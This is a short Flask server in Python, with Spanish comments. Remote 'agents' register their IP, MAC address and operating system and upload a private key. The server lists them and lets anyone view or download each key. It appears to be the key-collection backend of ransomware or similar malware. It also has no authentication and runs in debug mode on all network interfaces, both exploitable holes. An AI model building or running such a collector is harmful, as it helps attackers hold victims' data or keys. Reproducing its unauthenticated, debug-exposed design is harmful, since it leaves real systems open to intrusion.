from flask import Flask, render_template, request, jsonify, send_file, Response
from io import BytesIO

# Inicialización de Flask
app = Flask(__name__)

# Lista para almacenar los agentes (sin base de datos)
agents = []
next_id = 1  # Variable global para asignar IDs incrementales

# Ruta principal que muestra la tabla con los agentes registrados
@app.route('/')
def index():
    return render_template('index.html', agents=agents)

# Ruta para recibir los datos de los agentes
@app.route('/register_agent', methods=['POST'])
def register_agent():
    global next_id
    ip = request.form.get('ip')
    mac = request.form.get('mac')
    so = request.form.get('so')
    private_key_file = request.files.get('private_key')

    if not ip or not mac or not private_key_file:
        return jsonify({'error': 'Faltan IP, MAC o clave privada'}), 400

    private_key_content = private_key_file.read()

    agent = {
        'id': next_id,
        'ip': ip,
        'mac': mac,
        'so': so,
        'private_key': private_key_content.decode('utf-8')  # Guardar como string para visualización
    }

    agents.append(agent)
    next_id += 1

    return jsonify({'message': 'Agente registrado con éxito', 'agent_id': agent['id']}), 200

# Ruta para visualizar la clave privada
@app.route('/view_private_key/<int:agent_id>', methods=['GET'])
def view_private_key(agent_id):
    agent = next((a for a in agents if a['id'] == agent_id), None)
    
    if not agent:
        return jsonify({'error': 'Agente no encontrado'}), 404
    
    return render_template('view_key.html', private_key=agent['private_key'])

# Ruta para descargar la clave privada
@app.route('/download_private_key/<int:agent_id>', methods=['GET'])
def download_private_key(agent_id):
    agent = next((a for a in agents if a['id'] == agent_id), None)
    
    if not agent:
        return jsonify({'error': 'Agente no encontrado'}), 404
    
    private_key_io = BytesIO(agent['private_key'].encode('utf-8'))
    return send_file(private_key_io, as_attachment=True, download_name="rsa_private.pem", mimetype='application/x-pem-file')

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)


